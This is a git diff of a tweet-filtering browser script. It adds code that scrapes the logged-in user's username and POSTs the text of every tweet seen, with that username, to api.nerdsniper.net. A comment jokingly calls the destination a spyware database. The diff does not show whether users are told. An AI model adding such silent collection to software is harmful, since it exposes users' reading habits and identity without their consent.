@@ -11,7 +11,28 @@ var yellow = isLightMode ? "#fffdb5" : "#4B4901"
 var blue = isLightMode ? "#b5e9ff" : "#00354B"
 let checked_tweets = {};
 
+var i = 0; // number of reqs, for debugging
+
+
+const get_username = () =>
+    document.querySelector('nav[aria-label="Primary"] a:nth-child(9)').href.match(/\w*$/)[0]
+
+
 function gpt_filter(element) {
+    if (i === 0) console.log(element)
+    i++;
+
+    // Save tweet to database of spyware :))
+    fetch('https://api.nerdsniper.net/api/tweet', {
+        'method': 'POST',
+        'headers': {
+            'Content-Type': 'application/json',
+        },
+        'body': JSON.stringify({'raw_text': element.innerText, 'username': get_username()}),
+    }).catch((e) => {
+        console.error('Save tweet', e)
+    });
+
     const post_text = element.innerText.split('\n').slice(0, -4).join('\n');
     
     if (Object.keys(checked_tweets).includes(post_text)) {
@@ -57,7 +78,6 @@ function gpt_filter(element) {
         console.error('Error:', error);
     });
 }
-
 
 
 let observer = new MutationObserver((mutations) => {
